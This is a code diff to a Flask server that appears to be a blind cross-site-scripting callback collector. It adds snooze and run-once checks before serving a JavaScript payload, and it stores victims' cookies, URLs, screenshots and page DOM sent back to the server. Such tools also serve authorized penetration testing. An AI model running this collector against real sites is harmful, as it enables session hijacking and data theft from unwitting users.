@@ -22,13 +22,23 @@ def collector(xss_uid=1):
     Render Javascript payload with unique identifier and hosts for callback.
     """
     xss_uid = request.args.get('u', 1)
+    try:
+        the_payload = Payload.query.filter_by(id=int(xss_uid)).first()
+        if the_payload.snooze:
+            return ''
+        if the_payload.run_once and Capture.query.filter_by(payload_id=int(xss_uid)).first():
+            return ''
+    except:
+        pass 
+
+    # Default render tempalte, may need to modify based on new JS ideas
+    
     return render_template(
         'c.js',
         xss_uid=xss_uid,
         hostname=app.config['CALLBACK_HOSTNAME'],
         callback_protocol=app.config.get('CALLBACK_PROTOCOL', 'https')
     )
-
 
 def email_subscriptions(xss_uid, url):
     """
@@ -150,6 +160,7 @@ def get_callbacks():
             referrer = urllib.unquote(unicode(request.form.get('referrer', '')))
             cookies = urllib.unquote(unicode(request.form.get('cookies', '')))
             user_agent = urllib.unquote(unicode(request.form.get('user_agent', '')))
+            # TODO rename assessment to payload
             assessment = Payload.query.filter_by(id=int(request.form.get('xss_uid', 0))).first()
             xss_uid = assessment # what the heck
             # Payload.query.filter_by(id=int(request.form['xss_uid'])).first()
@@ -158,7 +169,7 @@ def get_callbacks():
 
             # If it's a rogue capture, log it anyway.
             if assessment is None:
-                client_info = Capture("Not found", url, referrer, cookies, user_agent, 1, screenshot, dom)
+                client_info = Capture("Not found", url, referrer, cookies, user_agent, 0, screenshot, dom)
             else:
                 # Create the capture with associated assessment/payload
                 client_info = Capture(assessment.id, url, referrer, cookies, user_agent, xss_uid.id, screenshot, dom)
